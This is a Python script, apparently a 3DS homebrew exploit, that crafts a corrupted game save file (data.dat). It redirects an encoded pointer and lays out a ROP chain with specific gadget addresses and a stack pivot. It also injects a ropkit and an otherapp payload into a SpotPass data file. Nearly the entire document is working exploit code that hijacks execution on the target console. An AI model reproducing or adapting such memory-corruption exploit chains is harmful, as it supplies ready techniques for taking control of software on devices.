import os,sys,struct
#1bf70
size=0x127c1c  #size of data.dat
d=0x33333333   #fuzz filler base value
out=bytearray(size)
OFFSET=0

redirect_offs=0x1bf5c  #data.dat offset, this is where exploit begins when this pointer is redirected (pointer is hidden with a conversion algo, see addr_convert)
linearmem_target=0x1574e790  #  start of initial takeover rop
pop_r4r7pc=0x100e60  #pop {r4, r5, r6, r7, pc}  # pc of initial pivot
pivot_args=0x244e08  #ldm r0, {r0, r1} ; ldr r2, [r0] ; ldr r2, [r2, #0xc] ; blx r2   setup r0/r1 for below stack pivot
pivot=0x12f6c0  #mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1

PAYLOAD_ADDR=0x1579e080  #ropkit to pivot to, finishing stage0. ropkit is embedded in the spotpass file  (weird charactor name inside boss/
POP_R1PC=0x00109d6c
POP_R0PC=0x0011a698
ROP_POPPC=0x001017b8

#0179d80c 1579d80c

def write32(offset, value):
	global out
	out[offset:offset+4]=struct.pack("<I",value)
	
def rop(value):
	global out, OFFSET
	out[OFFSET:OFFSET+4]=struct.pack("<I",value)
	OFFSET+=4
	
def addr_convert(addr):
	c=(addr - 0x678d88) // 8
	print(hex(c))
	return c
	


for i in range(0,size-1,4):  #fuzz code that fills data.dat. sequentially marked to track location in mem dumps
	temp=d+(i//4)
	out[i:i+4]=struct.pack("<I",temp)
	
write32(redirect_offs, addr_convert(linearmem_target))  #apply inital redirect. we're right next to an r1 branch in abount 4-5 instructions!

out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20   #this is close to the redirect address and seems to keep some addresses from crashing
	
OFFSET=0x1bf90         #take control then pivot to ropkit
rop(linearmem_target)
rop(pop_r4r7pc)
rop(pivot_args)
rop(pivot)
rop(POP_R0PC)
rop(PAYLOAD_ADDR)
rop(POP_R1PC)
rop(ROP_POPPC)
rop(pivot)

#summary: concat ropkit and otherapp and place into the spotpass file, then the exploit code into data.dat
with open("3ds_ropkit/otherapp.bin","rb") as f:  
	oapp=f.read()
	
with open("3ds_ropkit/ropkit.bin","rb") as f:
	ropkit=f.read()
	ropkit+=(b"\x00"*(0x400-len(ropkit)))

with open("308/boss/wTRu2!!!(`!!+s(@","rb+") as f: #i can't pronounce that spotpass file's name, any ideas?
	f.seek(0x1000-0xc)
	f.write(ropkit+oapp)

with open("308/user/data.dat","wb") as f:
	f.write(out)